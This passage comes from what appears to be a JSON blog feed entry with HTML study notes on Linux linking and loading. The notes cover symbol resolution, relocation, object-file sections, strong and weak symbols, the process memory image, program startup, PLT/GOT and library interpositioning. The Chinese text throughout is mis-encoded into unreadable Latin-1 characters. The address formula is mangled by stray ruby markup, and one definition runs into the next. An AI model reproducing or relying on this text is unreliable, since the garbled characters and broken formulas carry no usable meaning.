static å±æ€§å£°æ˜çš„å˜é‡ï¼‰ã€‚ç¬¦å·è§£æçš„ç›®çš„æ˜¯å°†æ¯ä¸ªç¬¦å·å¼•ç”¨æ­£å¥½å’Œä¸€ä¸ªç¬¦å·å®šä¹‰å…³è”èµ·æ¥ã€‚</p>\n<p>é‡å®šä½ï¼ˆ relocationï¼‰ã€‚ç¼–è¯‘å™¨å’Œæ±‡ç¼–å™¨ç”Ÿæˆä»åœ°å€ 0 å¼€å§‹çš„ä»£ç å’Œæ•°æ®èŠ‚ã€‚é“¾æ¥å™¨é€šè¿‡æŠŠæ¯ä¸ªç¬¦å·å®šä¹‰ä¸ä¸€ä¸ªå†…å­˜ä½ç½®å…³è”èµ·æ¥ï¼Œä»è€Œé‡å®šä½è¿™äº›èŠ‚ï¼Œç„¶åä¿®æ”¹æ‰€æœ‰å¯¹è¿™äº›ç¬¦å·çš„å¼•ç”¨ï¼Œä½¿å¾—å®ƒä»¬æŒ‡å‘è¿™ä¸ªå†…å­˜ä½ç½®ã€‚é“¾æ¥å™¨ä½¿ç”¨æ±‡ç¼–å™¨äº§ç”Ÿçš„é‡å®šä½æ¡ç›®ï¼ˆ relocation entryï¼‰çš„è¯¦ç»†æŒ‡ä»¤ï¼Œä¸åŠ ç”„åˆ«åœ°æ‰§è¡Œè¿™æ ·çš„é‡å®šä½ã€‚</p>\n<h2 id=\"ç›®æ ‡æ–‡ä»¶\"><a class=\"markdownIt-Anchor\" href=\"#ç›®æ ‡æ–‡ä»¶\">#</a> <strong>ç›®æ ‡æ–‡ä»¶</strong></h2>\n<p>ç›®æ ‡æ–‡ä»¶æœ‰ä¸‰ç§å½¢å¼ï¼š<br>\nâ€ƒâ€ƒ<strong>å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶</strong>ã€‚åŒ…å«äºŒè¿›åˆ¶ä»£ç å’Œæ•°æ®ï¼Œå…¶å½¢å¼å¯ä»¥åœ¨ç¼–è¯‘æ—¶ä¸å…¶ä»–å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶åˆå¹¶èµ·æ¥ï¼Œåˆ›å»ºä¸€ä¸ªå¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ã€‚åŒ…å«äºŒè¿›åˆ¶ä»£ç å’Œæ•°æ®ï¼Œå…¶å½¢å¼å¯ä»¥è¢«ç›´æ¥å¤åˆ¶åˆ°å†…å­˜å¹¶æ‰§è¡Œã€‚(main.o)</p>\n<p><strong>å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶</strong>ã€‚åŒ…å«äºŒè¿›åˆ¶ä»£ç å’Œæ•°æ®ï¼Œå…¶å½¢å¼å¯ä»¥è¢«ç›´æ¥å¤åˆ¶åˆ°å†…å­˜å¹¶æ‰§è¡Œã€‚(prog)</p>\n<p>å…±äº«ç›®æ ‡æ–‡ä»¶ã€‚ä¸€ç§ç‰¹æ®Šç±»å‹çš„å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ï¼Œå¯ä»¥åœ¨åŠ è½½æˆ–è€…è¿è¡Œæ—¶è¢«åŠ¨æ€åœ°åŠ è½½è¿›å†…å­˜å¹¶é“¾æ¥ã€‚</p>\n<p>ç¼–è¯‘å™¨å’Œæ±‡ç¼–å™¨ç”Ÿæˆå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ï¼ˆåŒ…æ‹¬å…±äº«ç›®æ ‡æ–‡ä»¶ï¼‰ã€‚é“¾æ¥å™¨ç”Ÿæˆå¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ã€‚</p>\n<p><img data-src=\"/images/image-20230924211257369.png\" alt=\"image-20230924211257369\"></p>\n<p>â€‹        <strong>.text</strong>ï¼šå·²ç¼–è¯‘ç¨‹åºçš„æœºå™¨ä»£ç ã€‚</p>\n<p><strong>.rodata</strong>ï¼šåªè¯»æ•°æ®ï¼Œæ¯”å¦‚ printf è¯­å¥ä¸­çš„æ ¼å¼ä¸²å’Œå¼€å…³è¯­å¥çš„è·³è½¬è¡¨ã€‚</p>\n<p><strong>.data</strong>ï¼šå·²åˆå§‹åŒ–çš„å…¨å±€å’Œé™æ€ C å˜é‡ã€‚å±€éƒ¨ C å˜é‡åœ¨è¿è¡Œæ—¶è¢«ä¿å­˜åœ¨æ ˆä¸­ï¼Œæ—¢ä¸å‡ºç°åœ¨ï¼Œdata èŠ‚ä¸­ï¼Œä¹Ÿä¸å‡ºç°åœ¨.bss èŠ‚ä¸­</p>\n<p><strong>.bss</strong>ï¼šæœªåˆå§‹åŒ–çš„å…¨å±€å’Œé™æ€ C å˜é‡ï¼Œä»¥åŠæ‰€æœ‰è¢«åˆå§‹åŒ–ä¸º 0 çš„å…¨å±€æˆ–é™æ€å˜é‡ã€‚åœ¨ç›®æ ‡æ–‡ä»¶ä¸­è¿™ä¸ªèŠ‚ä¸å æ®å®é™…çš„ç©ºé—´ï¼Œå®ƒä»…ä»…æ˜¯ä¸€ä¸ªå ä½ç¬¦ã€‚ç›®æ ‡æ–‡ä»¶æ ¼å¼åŒºåˆ†å·²åˆå§‹åŒ–å’Œæœªåˆå§‹åŒ–å˜é‡æ˜¯ä¸ºäº†ç©ºé—´æ•ˆç‡ï¼šåœ¨ç›®æ ‡æ–‡ä»¶ä¸­ï¼Œæœªåˆå§‹åŒ–å˜é‡ä¸éœ€è¦å æ®ä»»ä½•å®é™…çš„ç£ç›˜ç©ºé—´ã€‚è¿è¡Œæ—¶ï¼Œåœ¨å†…å­˜ä¸­åˆ†é…è¿™äº›å˜é‡ï¼Œåˆå§‹å€¼ä¸º 0ã€‚</p>\n<p><strong>.symtab</strong>ï¼šä¸€ä¸ªç¬¦å·è¡¨ï¼Œå®ƒå­˜æ”¾åœ¨ç¨‹åºä¸­å®šä¹‰å’Œå¼•ç”¨çš„å‡½æ•°å’Œå…¨å±€å˜é‡çš„ä¿¡æ¯ã€‚ä¸€äº›ç¨‹åºå‘˜é”™è¯¯åœ°è®¤ä¸ºå¿…é¡»é€šè¿‡ - g é€‰é¡¹æ¥ç¼–è¯‘ä¸€ä¸ªç¨‹åºï¼Œæ‰èƒ½å¾—åˆ°ç¬¦å·è¡¨ä¿¡æ¯ã€‚å®é™…ä¸Šï¼Œæ¯ä¸ªå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶åœ¨. symtab ä¸­éƒ½æœ‰ä¸€å¼ ç¬¦å·è¡¨ï¼ˆé™¤éç¨‹åºå‘˜ç‰¹æ„ç”¨ STRIP å‘½ä»¤å»æ‰å®ƒï¼‰ã€‚ç„¶è€Œï¼Œå’Œç¼–è¯‘å™¨ä¸­çš„ç¬¦å·è¡¨ä¸åŒï¼Œ symtab ç¬¦å·è¡¨ä¸åŒ…å«å±€éƒ¨å˜é‡çš„æ¡ç›®ã€‚</p>\n<p><strong>.rel.text</strong>ï¼šä¸€ä¸ª.text èŠ‚ä¸­ä½ç½®çš„åˆ—è¡¨ï¼Œå½“é“¾æ¥å™¨æŠŠè¿™ä¸ªç›®æ ‡æ–‡ä»¶å’Œå…¶ä»–æ–‡ä»¶ç»„åˆæ—¶ï¼Œéœ€è¦ä¿®æ”¹è¿™äº›ä½ç½®ã€‚ä¸€èˆ¬è€Œè¨€ï¼Œä»»ä½•è°ƒç”¨å¤–éƒ¨å‡½æ•°æˆ–è€…å¼•ç”¨å…¨å±€å˜é‡çš„æŒ‡ä»¤éƒ½éœ€è¦ä¿®æ”¹ã€‚å¦ä¸€æ–¹é¢ï¼Œè°ƒç”¨æœ¬åœ°å‡½æ•°çš„æŒ‡ä»¤åˆ™ä¸éœ€è¦ä¿®æ”¹ã€‚æ³¨æ„ï¼Œå¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ä¸­å¹¶ä¸éœ€è¦é‡å®šä½ä¿¡æ¯ï¼Œå› æ­¤é€šå¸¸çœç•¥ï¼Œé™¤éç”¨æˆ·æ˜¾å¼åœ°æŒ‡ç¤ºé“¾æ¥å™¨åŒ…å«è¿™äº›ä¿¡æ¯ã€‚</p>\n<p><strong>.rel.data</strong>ï¼šè¢«æ¨¡å—å¼•ç”¨æˆ–å®šä¹‰çš„æ‰€æœ‰å…¨å±€å˜é‡çš„é‡å®šä½ä¿¡æ¯ã€‚ä¸€èˆ¬è€Œè¨€ï¼Œä»»ä½•å·²åˆå§‹åŒ–çš„å…¨å±€å˜é‡ï¼Œå¦‚æœå®ƒçš„åˆå§‹å€¼æ˜¯ä¸€ä¸ªå…¨å±€å˜é‡åœ°å€æˆ–è€…å¤–éƒ¨å®šä¹‰å‡½æ•°çš„åœ°å€ï¼Œéƒ½éœ€è¦è¢«ä¿®æ”¹ã€‚</p>\n<p><strong>.debug</strong>ï¼šä¸€ä¸ªè°ƒè¯•ç¬¦å·è¡¨ï¼Œå…¶æ¡ç›®æ˜¯ç¨‹åºä¸­å®šä¹‰çš„å±€éƒ¨å˜é‡å’Œç±»å‹å®šä¹‰ï¼Œç¨‹åºä¸­å®šä¹‰å’Œå¼•ç”¨çš„å…¨å±€å˜é‡ï¼Œä»¥åŠåŸå§‹çš„ C æºæ–‡ä»¶ã€‚åªæœ‰ä»¥ - g é€‰é¡¹è°ƒç”¨ç¼–è¯‘å™¨é©±åŠ¨ç¨‹åºæ—¶ï¼Œæ‰ä¼šå¾—åˆ°è¿™å¼ è¡¨ã€‚</p>\n<p><strong>.line</strong>ï¼šåŸå§‹ C æºç¨‹åºä¸­çš„è¡Œå·å’Œ.text èŠ‚ä¸­æœºå™¨æŒ‡ä»¤ä¹‹é—´çš„æ˜ å°„ã€‚åªæœ‰ä»¥ - g é€‰é¡¹è°ƒç”¨ç¼–è¯‘å™¨é©±åŠ¨ç¨‹åºæ—¶ï¼Œæ‰ä¼šå¾—åˆ°è¿™å¼ è¡¨ã€‚</p>\n<p><strong>.strtab</strong>ï¼šä¸€ä¸ªå­—ç¬¦ä¸²è¡¨ï¼Œå…¶å†…å®¹åŒ…æ‹¬. symtab å’Œï¼Œ debug èŠ‚ä¸­çš„ç¬¦å·è¡¨ï¼Œä»¥åŠèŠ‚å¤´éƒ¨ä¸­çš„èŠ‚åå­—ã€‚å­—ç¬¦ä¸²è¡¨å°±æ˜¯ä»¥ null ç»“å°¾çš„å­—ç¬¦ä¸²çš„åºåˆ—ã€‚</p>\n<h2 id=\"ç¬¦å·å’Œç¬¦å·è¡¨\"><a class=\"markdownIt-Anchor\" href=\"#ç¬¦å·å’Œç¬¦å·è¡¨\">#</a> ç¬¦å·å’Œç¬¦å·è¡¨</h2>\n<p>æ¯ä¸ªå¯é‡å®šä½ç›®æ ‡æ¨¡å— m éƒ½æœ‰ä¸€ä¸ªç¬¦å·è¡¨ï¼Œå®ƒåŒ…å« m å®šä¹‰å’Œå¼•ç”¨çš„ç¬¦å·çš„ä¿¡æ¯ã€‚åœ¨é“¾æ¥å™¨çš„ä¸Šä¸‹æ–‡ä¸­ï¼Œæœ‰ä¸‰ç§ä¸åŒçš„ç¬¦å·ï¼š</p>\n<p>ç”±æ¨¡å— m å®šä¹‰å¹¶èƒ½è¢«å…¶ä»–æ¨¡å—å¼•ç”¨çš„å…¨å±€ç¬¦å·ã€‚å…¨å±€é“¾æ¥å™¨ç¬¦å·å¯¹åº”äºéé™æ€çš„ C å‡½æ•°å’Œå…¨å±€å˜é‡ã€‚</p>\n<p>ç”±å…¶ä»–æ¨¡å—å®šä¹‰å¹¶è¢«æ¨¡å— m å¼•ç”¨çš„å…¨å±€ç¬¦å·ã€‚è¿™äº›ç¬¦å·ç§°ä¸ºå¤–éƒ¨ç¬¦å·ï¼Œå¯¹åº”äºåœ¨å…¶ä»–æ¨¡å—ä¸­å®šä¹‰çš„éé™æ€ C å‡½æ•°å’Œå…¨å±€å˜é‡ã€‚</p>\n<p>åªè¢«æ¨¡å— m å®šä¹‰å’Œå¼•ç”¨çš„å±€éƒ¨ç¬¦å·ã€‚å®ƒä»¬å¯¹åº”äºå¸¦ static å±æ€§çš„ C å‡½æ•°å’Œå…¨å±€å˜é‡ã€‚è¿™äº›ç¬¦å·åœ¨æ¨¡å— m ä¸­ä»»ä½•ä½ç½®éƒ½å¯è§ï¼Œä½†æ˜¯ä¸èƒ½è¢«å…¶ä»–æ¨¡å—å¼•ç”¨ã€‚<br>\nå¦‚ä½•è§£æå¤šé‡å®šä¹‰çš„å…¨å±€ç¬¦å·</p>\n<p>é“¾æ¥å™¨çš„è¾“å…¥æ˜¯ä¸€ç»„å¯é‡å®šä½ç›®æ ‡æ¨¡å—ã€‚æ¯ä¸ªæ¨¡å—å®šä¹‰ä¸€ç»„ç¬¦å·ï¼Œæœ‰äº›æ˜¯å±€éƒ¨çš„ï¼ˆåªå¯¹å®šä¹‰è¯¥ç¬¦å·çš„æ¨¡å—å¯è§ï¼‰ï¼Œæœ‰äº›æ˜¯å…¨å±€çš„ï¼ˆå¯¹å…¶ä»–æ¨¡å—ä¹Ÿå¯è§ï¼‰ã€‚å¦‚æœå¤šä¸ªæ¨¡å—å®šä¹‰åŒåçš„å…¨å±€ç¬¦å·ï¼Œä¼šå‘ç”Ÿä»€ä¹ˆå‘¢ï¼Ÿä¸‹é¢æ˜¯ Linux ç¼–è¯‘ç³»ç»Ÿé‡‡ç”¨çš„æ–¹æ³•ã€‚</p>\n<p>åœ¨ç¼–è¯‘æ—¶ï¼Œç¼–è¯‘å™¨å‘æ±‡ç¼–å™¨è¾“å‡ºæ¯ä¸ªå…¨å±€ç¬¦å·ï¼Œæˆ–è€…æ˜¯å¼ºï¼ˆ strongï¼‰æˆ–è€…æ˜¯å¼±ï¼ˆweakï¼‰ï¼Œè€Œæ±‡ç¼–å™¨æŠŠè¿™ä¸ªä¿¡æ¯éšå«åœ°ç¼–ç åœ¨å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶çš„ç¬¦å·è¡¨é‡Œã€‚å‡½æ•°å’Œå·²åˆå§‹åŒ–çš„å…¨å±€å˜é‡æ˜¯å¼ºç¬¦å·ï¼Œæœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡æ˜¯å¼±ç¬¦å·ã€‚<br>\nâ€ƒâ€ƒæ ¹æ®å¼ºå¼±ç¬¦å·çš„å®šä¹‰ï¼Œ Linux é“¾æ¥å™¨ä½¿ç”¨ä¸‹é¢çš„è§„åˆ™æ¥å¤„ç†å¤šé‡å®šä¹‰çš„ç¬¦å·å</p>\n<p>è§„åˆ™ 1ï¼šä¸å…è®¸æœ‰å¤šä¸ªåŒåçš„å¼ºç¬¦å·ã€‚</p>\n<p>è§„åˆ™ 2ï¼šå¦‚æœæœ‰ä¸€ä¸ªå¼ºç¬¦å·å’Œå¤šä¸ªå¼±ç¬¦å·åŒåï¼Œé‚£ä¹ˆé€‰æ‹©å¼ºç¬¦å·ã€‚</p>\n<p>è§„åˆ™ 3ï¼šå¦‚æœæœ‰å¤šä¸ªå¼±ç¬¦å·åŒåï¼Œé‚£ä¹ˆä»è¿™äº›å¼±ç¬¦å·ä¸­ä»»æ„é€‰æ‹©ä¸€ä¸ªã€‚</p>\n<h2 id=\"é‡å®šä½\"><a class=\"markdownIt-Anchor\" href=\"#é‡å®šä½\">#</a> é‡å®šä½</h2>\n<p>ä¸€æ—¦é“¾æ¥å™¨å®Œæˆäº†ç¬¦å·è§£æè¿™ä¸€æ­¥ï¼Œå°±æŠŠä»£ç ä¸­çš„æ¯ä¸ªç¬¦å·å¼•ç”¨å’Œæ­£å¥½ä¸€ä¸ªç¬¦å·å®šä¹‰ï¼ˆå³å®ƒçš„ä¸€ä¸ªè¾“å…¥ç›®æ ‡æ¨¡å—ä¸­çš„ä¸€ä¸ªç¬¦å·è¡¨æ¡ç›®ï¼‰å…³è”èµ·æ¥ã€‚æ­¤æ—¶ï¼Œé“¾æ¥å™¨å°±çŸ¥é“å®ƒçš„è¾“å…¥ç›®æ ‡æ¨¡å—ä¸­çš„ä»£ç èŠ‚å’Œæ•°æ®èŠ‚çš„ç¡®åˆ‡å¤§å°ã€‚ç°åœ¨å°±å¯ä»¥å¼€å§‹é‡å®šä½æ­¥éª¤äº†ï¼Œåœ¨è¿™ä¸ªæ­¥éª¤ä¸­ï¼Œå°†åˆå¹¶è¾“å…¥æ¨¡å—ï¼Œå¹¶ä¸ºæ¯ä¸ªç¬¦å·åˆ†é…è¿è¡Œæ—¶åœ°å€ã€‚é‡å®šä½ç”±ä¸¤æ­¥ç»„æˆï¼š</p>\n<p>é‡å®šä½èŠ‚å’Œç¬¦å·å®šä¹‰ã€‚åœ¨è¿™ä¸€æ­¥ä¸­ï¼Œé“¾æ¥å™¨å°†æ‰€æœ‰ç›¸åŒç±»å‹çš„èŠ‚åˆå¹¶ä¸ºåŒä¸€ç±»å‹çš„æ–°çš„èšåˆèŠ‚ã€‚ä¾‹å¦‚ï¼Œæ¥è‡ªæ‰€æœ‰è¾“å…¥æ¨¡å—çš„.data èŠ‚è¢«å…¨éƒ¨åˆå¹¶æˆä¸€ä¸ªèŠ‚ï¼Œè¿™ä¸ªèŠ‚æˆä¸ºè¾“å‡ºçš„å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶çš„.data èŠ‚ã€‚ç„¶åï¼Œé“¾æ¥å™¨å°†è¿è¡Œæ—¶å†…å­˜åœ°å€èµ‹ç»™æ–°çš„èšåˆèŠ‚ï¼Œèµ‹ç»™è¾“äººæ¨¡å—å®šä¹‰çš„æ¯ä¸ªèŠ‚ï¼Œä»¥åŠèµ‹ç»™è¾“äººæ¨¡å—å®šä¹‰çš„æ¯ä¸ªç¬¦å·ã€‚å½“è¿™ä¸€æ­¥å®Œæˆæ—¶ï¼Œç¨‹åºä¸­çš„æ¯æ¡æŒ‡ä»¤å’Œå…¨å±€å˜é‡éƒ½æœ‰å”¯ä¸€çš„è¿è¡Œæ—¶å†…å­˜åœ°å€äº†ã€‚</p>\n<p>é‡å®šä½èŠ‚ä¸­çš„ç¬¦å·å¼•ç”¨ã€‚åœ¨è¿™ä¸€æ­¥ä¸­ï¼Œé“¾æ¥å™¨ä¿®æ”¹ä»£ç èŠ‚å’Œæ•°æ®èŠ‚ä¸­å¯¹æ¯ä¸ªç¬¦å·çš„å¼•ç”¨ï¼Œä½¿å¾—å®ƒä»¬æŒ‡å‘æ­£ç¡®çš„è¿è¡Œæ—¶åœ°å€ã€‚è¦æ‰§è¡Œè¿™ä¸€æ­¥ï¼Œé“¾æ¥å™¨ä¾èµ–äºå¯é‡å®šä½ç›®æ ‡æ¨¡å—ä¸­ç§°ä¸ºé‡å®šä½æ¡ç›®ï¼ˆ relocation entryï¼‰çš„æ•°æ®ç»“æ„ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥å°†ä¼šæè¿°è¿™ç§æ•°æ®ç»“æ„ã€‚<br>\nåŠ è½½å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶</p>\n<p>æ¯ä¸ª Linux ç¨‹åºéƒ½æœ‰ä¸€ä¸ªè¿è¡Œæ—¶å†…å­˜æ˜ åƒï¼Œç±»ä¼¼äºå›¾ 7-15 ä¸­æ‰€ç¤ºã€‚åœ¨ Linux x86-64 ç³»ç»Ÿä¸­ï¼Œä»£ç æ®µæ€»æ˜¯ä»åœ°å€ 0x400000 å¤„å¼€å§‹ï¼Œåé¢æ˜¯æ•°æ®æ®µã€‚è¿è¡Œæ—¶å †åœ¨æ•°æ®æ®µä¹‹åï¼Œé€šè¿‡è°ƒç”¨ malloc åº“å¾€ä¸Šå¢é•¿ã€‚å †åé¢çš„åŒºåŸŸæ˜¯ä¸ºå…±äº«æ¨¡å—ä¿ç•™çš„ã€‚ç”¨æˆ·æ ˆæ€»æ˜¯ä»æœ€å¤§çš„åˆæ³•ç”¨æˆ·åœ°å€ï¼ˆ 2 48 âˆ’ 1 2^<ruby>48}-1 248âˆ’1ï¼‰å¼€å§‹ï¼Œå‘è¾ƒå°å†…å­˜åœ°å€å¢é•¿ã€‚æ ˆä¸Šçš„åŒºåŸŸï¼Œä»åœ°å€ 2 48 âˆ’ 1 2<rp>ã€</rp><rt>{48</rt><rp>ã€‘</rp></ruby>-1 248âˆ’1 å¼€å§‹ï¼Œæ˜¯ä¸ºå†…æ ¸ï¼ˆ kernelï¼‰ä¸­çš„ä»£ç å’Œæ•°æ®ä¿ç•™çš„ï¼Œæ‰€è°“å†…æ ¸å°±æ˜¯æ“ä½œç³»ç»Ÿé©»ç•™åœ¨å†…å­˜çš„éƒ¨åˆ†ã€‚</p>\n<p>ä¸ºäº†ç®€æ´ï¼Œæˆ‘ä»¬æŠŠå †ã€æ•°æ®å’Œä»£ç æ®µç”»å¾—å½¼æ­¤ç›¸é‚»ï¼Œå¹¶ä¸”æŠŠæ ˆé¡¶æ”¾åœ¨äº†æœ€å¤§çš„åˆæ³•ç”¨æˆ·åœ°å€å¤„ã€‚å®é™…ä¸Šï¼Œç”±äº.data æ®µæœ‰å¯¹é½è¦æ±‚ï¼Œæ‰€ä»¥ä»£ç æ®µå’Œæ•°æ®æ®µä¹‹é—´æ˜¯æœ‰é—´éš™çš„ã€‚åŒæ—¶ï¼Œåœ¨åˆ†é…æ ˆã€å…±äº«åº“å’Œå †æ®µè¿è¡Œæ—¶åœ°å€çš„æ—¶å€™ï¼Œé“¾æ¥å™¨è¿˜ä¼šä½¿ç”¨åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ã€‚è™½ç„¶æ¯æ¬¡ç¨‹åºè¿è¡Œæ—¶è¿™äº›åŒºåŸŸçš„åœ°å€éƒ½ä¼šæ”¹å˜ï¼Œå®ƒä»¬çš„ç›¸å¯¹ä½ç½®æ˜¯ä¸å˜çš„ã€‚</p>\n<p>å½“åŠ è½½å™¨è¿è¡Œæ—¶ï¼Œå®ƒåˆ›å»ºç±»ä¼¼äºå›¾ 7-15 æ‰€ç¤ºçš„å†…å­˜æ˜ åƒã€‚åœ¨ç¨‹åºå¤´éƒ¨è¡¨çš„å¼•å¯¼ä¸‹ï¼ŒåŠ è½½å™¨å°†å¯æ‰§è¡Œæ–‡ä»¶çš„ç‰‡ï¼ˆ chunkï¼‰å¤åˆ¶åˆ°ä»£ç æ®µå’Œæ•°æ®æ®µã€‚æ¥ä¸‹æ¥ï¼ŒåŠ è½½å™¨è·³è½¬åˆ°ç¨‹åºçš„å…¥å£ç‚¹ï¼Œä¹Ÿå°±æ˜¯ _start å‡½æ•°çš„åœ°å€ã€‚è¿™ä¸ªå‡½æ•°æ˜¯åœ¨ç³»ç»Ÿç›®æ ‡æ–‡ä»¶ ctrl.o ä¸­å®šä¹‰çš„ï¼Œå¯¹æ‰€æœ‰çš„ C ç¨‹åºéƒ½æ˜¯ä¸€æ ·çš„ã€‚ _start å‡½æ•°è°ƒç”¨ç³»ç»Ÿå¯åŠ¨å‡½æ•° __libc_start_mainï¼Œè¯¥å‡½æ•°å®šä¹‰åœ¨ libc.so ä¸­ã€‚å®ƒåˆå§‹åŒ–æ‰§è¡Œç¯å¢ƒï¼Œè°ƒç”¨ç”¨æˆ·å±‚çš„ main å‡½æ•°ï¼Œå¤„ç† main å‡½æ•°çš„è¿”å›å€¼ï¼Œå¹¶ä¸”åœ¨éœ€è¦çš„æ—¶å€™æŠŠæ§åˆ¶è¿”å›ç»™å†…æ ¸ã€‚</p>\n<p><img data-src=\"/images/image-20230925210855784.png\" alt=\"image-20230925210855784\"></p>\n<p><img data-src=\"/images/image-20230925215033572.png\" alt=\"image-20230925215033572\"></p>\n<p><img data-src=\"/images/image-20230924225447543.png\" alt=\"image-20230924225447543\"></p>\n<p><img data-src=\"/images/image-20230926180947308.png\" alt=\"image-20230926180947308\"></p>\n<p><img data-src=\"/images/image-20230926180842723.png\" alt=\"image-20230926180842723\"></p>\n<p><img data-src=\"/images/image-20230926181234936.png\" alt=\"image-20230926181234936\"></p>\n<p><img data-src=\"/images/image-20230926181704967.png\" alt=\"image-20230926181704967\"></p>\n<p><img data-src=\"/images/image-20230926181844716.png\" alt=\"image-20230926181844716\"></p>\n<p>plt å’Œ got è¡¨</p>\n<p>Linux é“¾æ¥å™¨æ”¯æŒä¸€ä¸ªå¾ˆå¼ºå¤§çš„æŠ€æœ¯ï¼Œç§°ä¸ºåº“æ‰“æ¡© (library interpositioning), å®ƒå…è®¸ä½ æˆªè·å¯¹å…±äº«åº“å‡½æ•°çš„è°ƒç”¨ï¼Œå–è€Œä»£ä¹‹æ‰§è¡Œè‡ªå·±çš„ä»£ç ã€‚</p>\n<link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "ç¬”è®°"
            ]
        }
    ]
}